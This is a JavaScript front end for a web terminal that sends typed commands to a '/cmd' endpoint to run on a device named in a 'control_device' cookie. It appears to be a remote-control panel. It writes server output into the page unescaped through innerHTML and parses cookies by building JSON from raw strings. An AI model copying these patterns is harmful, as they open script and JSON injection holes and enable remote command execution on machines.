const terminal = document.querySelector('.terminal');
const commands_history = [];
const used_commands = [];
const output_history = [];
let history_index = 0;
let IP = parseCookies(document.cookie)['control_device'];
let PATH = 'c://Users/';

function main() {
    newLine(true, false);
}

main();

async function commandHandler(command) {
    if(command.split(' ')[0] === 'cd')
        PATH = command.split(' ')[1];
    else {
        output = await getUrl(`/cmd?command=${encodeURIComponent(command)}&path=${encodeURIComponent(PATH)}`);
        output_history.push(output);
        used_commands.push(command);
        
        terminal.innerHTML = '';
        output_history.forEach((out, i) => {
            newLine(used_commands[i], out);
        });
    }    
    newLine(true, false); //input
    return;
}

async function newLine(input, stdout) {
    const ip = IP.replace('>', '@');
    const path = PATH;

    const line = document.createElement('span');
    const ip_text = document.createElement('span');
    const path_text = document.createElement('span');
    
    line.setAttribute('class', 'text-line');
    ip_text.setAttribute('class', 'ip');
    path_text.setAttribute('class', 'path');
    
    ip_text.innerText = ip;
    path_text.innerText = path;

    let command;
    if(input === true) {
        command = document.createElement('input');
        command.type = 'text';

        let triggered = false;
        command.addEventListener('keydown', e => {
            if(e.keyCode === 0)
                return;
            if(!triggered) { //avoid holding down key
                if(e.keyCode === 38) {
                    e.preventDefault();
                    if(history_index < commands_history.length)
                        e.target.value = commands_history[history_index++];
                } else if(e.keyCode === 40) {
                    e.preventDefault();
                    if(history_index > 1)
                        e.target.value = commands_history[--history_index-1];
                } else
                    history_index = 0; //reset index
                triggered = true;
            }
        });

        command.addEventListener('keyup', e => triggered = false); //reset

        command.addEventListener('change', e => {
            terminal.removeChild(line);
            const cmd = e.target.value;
            if(cmd === '')
                return;
            if(!commands_history.includes(cmd))
                commands_history.push(cmd);
            history_index = commands_history.length;
            commandHandler(cmd);
        });
    } else {
        command = document.createElement('span');
        command.innerText = input;
    }

    command.setAttribute('class', 'command');

    line.appendChild(ip_text);
    line.innerHTML += ':';
    line.appendChild(path_text);
    line.innerHTML += '$ ';
    line.appendChild(command);

    if(stdout) {
        const output = document.createElement('pre');
        output.innerHTML = `<br>${stdout}<br>`;
        line.appendChild(output);
    }

    terminal.appendChild(line);
    command.focus();
}

async function getUrl(url) {
    return new Promise((resolve, reject) => {
        const req = new XMLHttpRequest();
        req.onreadystatechange = e => {
            if(req.readyState === 4 && req.status === 200)
                resolve(req.responseText);
        }
        req.open('GET', url, true);
        req.send();
    });
}

function parseCookies(cookies) {
    let result = {}
    const items = cookies.split(';');

    for(const item of items) {
        const [ key, value ] = item.replace(/"/g, '\'').split('='); //replace " with ', to avoid errors
        Object.assign(result, JSON.parse(`{
            "${key}": "${value}"
        }`));
    }

    return result;
}